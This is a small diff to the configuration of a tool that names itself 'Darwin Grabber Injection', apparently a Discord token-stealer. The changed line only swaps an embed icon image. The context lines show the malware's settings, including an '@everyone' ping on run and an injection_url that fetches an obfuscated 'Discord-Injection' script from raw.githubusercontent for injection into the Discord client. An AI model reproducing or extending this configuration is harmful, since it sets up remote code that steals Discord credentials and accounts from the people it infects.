@@ -13,7 +13,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone', 
   embed_name: 'Darwin Grabber Injection', 
-  embed_icon: 'https://i.pinimg.com/736x/4e/a6/39/4ea63956ed4deb017f5107b69f62f3dc.jpg',
+  embed_icon: 'https://i.pinimg.com/736x/56/21/05/562105de83bd455929568969f2800b68.jpg',
   embed_color: 328965, 
   injection_url: 'https://raw.githubusercontent.com/Blank-c/Discord-Injection-BG/main/injection-obfuscated.js', 
 
